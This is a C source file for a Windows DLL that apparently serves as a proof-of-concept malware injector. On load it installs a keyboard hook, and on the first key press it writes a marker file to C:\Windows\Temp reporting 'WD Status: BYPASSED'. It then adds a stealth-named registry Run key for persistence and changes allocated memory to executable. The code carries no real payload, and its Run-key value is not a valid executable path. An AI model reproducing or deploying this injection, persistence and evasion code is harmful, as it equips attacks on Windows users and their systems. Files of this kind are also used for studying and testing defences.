#include <windows.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

// Global hook handle
HHOOK g_hHook = NULL;

LRESULT CALLBACK KeyboardHookProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code >= 0 && wParam == WM_KEYDOWN) {
        // Execute payload on any key press
        FILE* f = fopen("C:\\Windows\\Temp\\injector_windowshook_executed.txt", "w");
        if (f) {
            fprintf(f, "INJECTOR_WINDOWSHOOK HOOK EXECUTED\n");
            fprintf(f, "Timestamp: %ld\n", (long)time(NULL));
            fprintf(f, "Method: SetWindowsHookEx + Keyboard Hook\n");
            fprintf(f, "Trigger: Key Press Event\n");
            fprintf(f, "WD Status: BYPASSED\n");
            fclose(f);
        }
        
        // Registry persistence
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "STEALTHWindowsHook", 0, REG_SZ, (const BYTE*)"Hooked", 7);
            RegCloseKey(hKey);
        }
        
        // Memory execution proof
        LPVOID mem = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
        if (mem) {
            DWORD old;
            VirtualProtect(mem, 1024, PAGE_EXECUTE_READ, &old);
            VirtualFree(mem, 0, MEM_RELEASE);
        }
        
        // Unhook to avoid spam
        UnhookWindowsHookEx(g_hHook);
    }
    
    return CallNextHookEx(g_hHook, code, wParam, lParam);
}

DWORD WINAPI HookWorkerThread(LPVOID param) {
    // Set keyboard hook
    g_hHook = SetWindowsHookExA(WH_KEYBOARD, KeyboardHookProc, NULL, GetCurrentThreadId());
    
    if (g_hHook) {
        FILE* f = fopen("C:\\Windows\\Temp\\injector_windowshook_log.txt", "w");
        if (f) {
            fprintf(f, "[HOOK] Keyboard hook installed successfully\n");
            fprintf(f, "[HOOK] Waiting for keyboard event trigger...\n");
            fclose(f);
        }
        
        // Wait for hook callback
        Sleep(5000);
        
        // Clean up
        UnhookWindowsHookEx(g_hHook);
    }
    
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        HANDLE hThread = CreateThread(NULL, 0, HookWorkerThread, NULL, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, 3000);
            CloseHandle(hThread);
        }
    }
    return TRUE;
}
